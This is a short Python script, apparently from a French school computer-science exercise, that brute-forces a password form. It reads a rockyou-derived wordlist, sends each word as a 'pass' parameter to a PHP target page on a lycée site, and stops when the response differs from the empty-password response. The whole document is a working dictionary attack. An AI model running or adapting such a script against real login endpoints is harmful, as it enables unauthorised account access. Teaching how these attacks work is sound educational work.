import requests

with open('extraitrockyou.txt') as file:
    dictionnaire = file.read().splitlines()

url = 'http://lyceevalois.com/nsi/form_cg/cible.php'

invalid_password = requests.get(url,{'pass':''}).text
print("Hacking ...")

for attempt in range(len(dictionnaire)-1):
    password = dictionnaire[attempt]
    rqt = requests.get(f'{url}?pass={password}')

    if rqt.text != invalid_password:
        print(f'{attempt} : {password} ({rqt.status_code}) ')
        break
